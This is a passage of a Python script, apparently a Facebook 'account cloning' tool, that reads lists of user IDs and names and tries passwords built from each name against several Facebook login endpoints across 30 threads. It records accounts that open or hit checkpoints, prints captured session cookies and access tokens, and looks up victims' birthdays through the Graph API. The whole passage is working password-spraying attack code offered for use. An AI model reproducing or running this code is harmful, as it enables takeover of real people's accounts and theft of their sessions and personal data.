			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		sys.stdout.write(
			"\r  (\033[1;96m•\033[1;97m) %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				self.ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in send.json()["error_msg"]:
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop += 1
	def __method__1__(self):
		print("\n  \033[1;92m(\033[1;91m1\033[1;92m)\x1b[1;97m Clone only 100074 & 100075 account")
		print("  \033[1;92m(\033[1;91m2\033[1;92m)\x1b[1;97m Clone All in one Account")
		print("  \033[1;92m(\033[1;91m3\033[1;92m)\x1b[1;97m Clone using file path")
		__method__1__ = input("\n  \033[1;92m(\033[1;91m*\033[1;92m)\x1b[1;97m Choose Option :  ")
		if __method__1__ == "":
			self.menu_file()
		elif __method__1__ == "1":
			self.__10000__()
		elif __method__1__ == "2":
			self.__Frrr__()
		elif __method__1__ == "3":
			self.__mennn__()
	def __10000__(self):
		try:
			file = '/storage/emulated/0/100.txt'
			for line in open(file, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(file))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __Frrr__(self):
		try:
			myfile = '/storage/emulated/0/f_rindlist.txt'
			for line in open(myfile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(myfile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __mennn__(self):
		try:
			pastefile = input('  \033[1;92m(\033[1;94m+\033[1;92m) \033[1;97m Enter your file : ')
			for line in open(pastefile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(pastefile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						elif len(name)<=2:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						elif len(name)<=3:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						coeg.submit(self.__file__, uid, pwx)
	def __file__(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		url = 'https://mbasic.facebook.com'
		sys.stdout.write(
			"\r  (\033[1;93m•\033[1;97m) %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw= pw.lower()
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print("\r  \033[0;92m• %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print("\r  \033[0;93m• %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	def __method__3__(self):
		print("\n  \033[1;92m(\033[1;91m1\033[1;92m)\x1b[1;97m Clone only 100074 & 100075 account")
		print("  \033[1;92m(\033[1;91m2\033[1;92m)\x1b[1;97m Clone All in one Account")
		print("  \033[1;92m(\033[1;91m3\033[1;92m)\x1b[1;97m Clone using file path")
		__method__3__ = input("\n  \033[1;92m(\033[1;91m*\033[1;92m)\x1b[1;97m Choose Option :  ")
		if __method__3__ == "":
			self.menu_file()
		elif __method__3__ == "1":
			self.__100__()
		elif __method__3__ == "2":
			self.__Fr__()
		elif __method__3__ == "3":
			self.__men__()
	def __100__(self):
		try:
			file = '/storage/emulated/0/100.txt'
			for line in open(file, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(file))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __Fr__(self):
		try:
			myfile = '/storage/emulated/0/f_rindlist.txt'
			for line in open(myfile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(myfile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
						coeg.submit(self.__mbasic__, uid, pwx)
	def __men__(self):
		try:
			pastefile = input('  \033[1;92m(\033[1;94m+\033[1;92m) \033[1;97m Enter your file : ')
			for line in open(pastefile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(pastefile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __mbasic__(self, uid, pwx, **kwargs):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		sys.stdout.write(
			"\r  (•) %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		host = 'https://free.facebook.com'
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				self.open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						self.cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
				
		self.loop +=1
	def main_coeg():
		os.system("git pull")
		os.system("touch login.txt")
		try:os.mkdir("/sdcard/")
		except:pass
		try:os.mkdir("OK")
		except:pass
try:
	Somi().__request__()
except Exception as e:
	exit(str(e))
